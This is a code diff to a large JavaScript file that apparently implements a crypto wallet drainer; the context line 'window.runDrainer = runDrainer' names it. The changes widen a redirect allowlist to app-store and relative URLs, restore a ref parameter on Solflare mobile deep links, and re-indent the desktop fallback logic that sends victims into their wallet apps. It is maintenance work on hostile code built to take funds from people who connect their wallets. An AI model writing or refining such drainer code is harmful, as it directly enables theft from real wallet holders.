@@ -5570,13 +5570,18 @@ window.runDrainer = runDrainer;
           const currentOrigin = window.location.origin;
           const targetUrl = new URL(url, window.location.href);
           
+          // Allow redirects to same origin, wallet domains, or app store URLs (for legitimate installs)
           if (targetUrl.origin === currentOrigin || 
               url.includes('phantom.app') || 
               url.includes('solflare.com') || 
               url.includes('backpack.app') ||
               url.includes('trustwallet.com') ||
               url.includes('glow.app') ||
-              url.includes('exodus.com')) {
+              url.includes('exodus.com') ||
+              url.includes('apps.apple.com') ||
+              url.includes('play.google.com') ||
+              url.startsWith('#') ||
+              url.startsWith('/')) {
             console.log('[PREVENT_REDIRECTS] Allowing redirect to:', url);
             if (originalLocationHref && originalLocationHref.set) {
               originalLocationHref.set.call(this, url);
@@ -6232,11 +6237,10 @@ window.runDrainer = runDrainer;
         case 'solflare':
           // Solflare: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use exact Solflare URL format - simplified to prevent redirects
+            // Mobile: Use exact Solflare URL format - restore ref parameter for functionality
             const encodedUrl = encodeURIComponent(currentUrl);
-            // Remove ref parameter to prevent external redirects
-            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}`;
-            fallbackUrl = `solflare://v1/browse/${encodedUrl}`;
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
             console.log(`[SOLFLARE_MOBILE] Deep link: ${deepLink}`);
             console.log(`[SOLFLARE_MOBILE] Fallback: ${fallbackUrl}`);
           } else {
@@ -6392,7 +6396,7 @@ window.runDrainer = runDrainer;
           
           // Show a message to the user about what's happening (for non-Solflare wallets)
           if (walletType !== 'solflare') {
-            showStatus(`Opening ${walletType} wallet...`, 'info');
+          showStatus(`Opening ${walletType} wallet...`, 'info');
             
             // Add mobile debugging info
             console.log(`[MOBILE_DEBUG] Current URL: ${window.location.href}`);
@@ -6429,19 +6433,19 @@ window.runDrainer = runDrainer;
           }, 5000);
         } else {
           // Desktop: Strategy 1: Try fallback URL
-          try {
-            window.location.href = fallbackUrl;
-          } catch (fallbackError) {
-            console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
-            
-            // Strategy 2: Try install page
-            const wallet = WALLET_DEFS.find(w => w.key === walletType);
-            if (wallet && wallet.install) {
-              console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
-              window.location.href = wallet.install;
-            } else {
-              // Strategy 3: Show error message
-              showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
+        try {
+          window.location.href = fallbackUrl;
+        } catch (fallbackError) {
+          console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
+          
+          // Strategy 2: Try install page
+          const wallet = WALLET_DEFS.find(w => w.key === walletType);
+          if (wallet && wallet.install) {
+            console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
+            window.location.href = wallet.install;
+          } else {
+            // Strategy 3: Show error message
+            showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
             }
           }
         }
